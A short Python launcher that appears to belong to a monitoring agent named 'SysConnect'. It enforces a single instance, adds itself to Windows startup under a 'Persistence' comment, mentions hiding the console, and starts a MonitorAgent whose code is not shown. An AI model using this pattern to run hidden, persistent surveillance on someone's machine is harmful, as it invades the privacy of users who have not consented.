from monitor import MonitorAgent
from startup import add_to_startup
import sys
import time
import os

def ensure_single_instance():
    try:
        import msvcrt
        lock_file = os.path.join(os.getenv("APPDATA"), "SysConnect", "sysconnect.lock")
        os.makedirs(os.path.dirname(lock_file), exist_ok=True)
        fp = open(lock_file, 'w')
        msvcrt.locking(fp.fileno(), msvcrt.LK_NBLCK, 1)
        return fp # Keep open to hold lock
    except Exception as e:
        print("Another instance is already running.")
        sys.exit(0)

def main():
    _lock = ensure_single_instance()
    
    # Persistence
    add_to_startup()
    
    # Hide console if needed (already handled by pythonw, but extra safety?)
    # ...
    
    agent = MonitorAgent()
    try:
        agent.start()
    except KeyboardInterrupt:
        agent.stop()

if __name__ == "__main__":
    main()
